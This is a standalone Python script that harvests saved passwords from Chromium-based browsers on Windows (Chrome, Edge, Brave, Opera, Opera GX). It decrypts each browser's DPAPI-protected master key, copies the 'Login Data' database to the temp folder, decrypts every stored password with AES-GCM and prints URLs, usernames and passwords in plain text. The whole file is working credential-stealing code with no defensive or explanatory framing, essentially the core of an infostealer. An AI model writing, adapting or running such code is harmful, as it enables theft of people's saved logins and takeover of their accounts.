import os
import shutil
import sqlite3
import json
import base64
import win32crypt
from Cryptodome.Cipher import AES

def get_chrome_based_browsers():
    local = os.getenv("LOCALAPPDATA")
    roaming = os.getenv("APPDATA")
    return {
        "Chrome": os.path.join(local, "Google", "Chrome", "User Data"),
        "Edge": os.path.join(local, "Microsoft", "Edge", "User Data"),
        "Brave": os.path.join(local, "BraveSoftware", "Brave-Browser", "User Data"),
        "Opera": os.path.join(roaming, "Opera Software", "Opera Stable"),
        "Opera GX": os.path.join(roaming, "Opera Software", "Opera GX Stable"),
        # Add more as needed
    }

def get_master_key(browser_path):
    local_state_path = os.path.join(browser_path, "Local State")
    if not os.path.exists(local_state_path):
        return None
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    encrypted_key = encrypted_key[5:]  # Remove DPAPI prefix
    master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    return master_key

def decrypt_password(buff, master_key):
    try:
        if buff[:3] == b'v10':
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)[:-16].decode()
            return decrypted_pass
        else:
            return win32crypt.CryptUnprotectData(buff, None, None, None, 0)[1].decode()
    except Exception:
        return ""

def extract_browser_passwords():
    results = []
    browsers = get_chrome_based_browsers()
    for browser, path in browsers.items():
        login_db = os.path.join(path, "Default", "Login Data")
        if not os.path.exists(login_db):
            continue
        # Copy DB to avoid lock
        tmp_db = os.path.join(os.getenv("TEMP"), f"{browser}_LoginData.db")
        try:
            shutil.copy2(login_db, tmp_db)
            conn = sqlite3.connect(tmp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            master_key = get_master_key(path)
            for row in cursor.fetchall():
                url, username, encrypted_password = row
                password = decrypt_password(encrypted_password, master_key)
                if username or password:
                    results.append({
                        "browser": browser,
                        "url": url,
                        "username": username,
                        "password": password
                    })
            cursor.close()
            conn.close()
            os.remove(tmp_db)
        except Exception as e:
            continue
    return results

if __name__ == "__main__":
    passwords = extract_browser_passwords()
    if passwords:
        print("Browser Passwords:")
        for entry in passwords:
            print(f"[{entry['browser']}] {entry['url']} | {entry['username']} | {entry['password']}")
    else:
        print("No passwords found.")
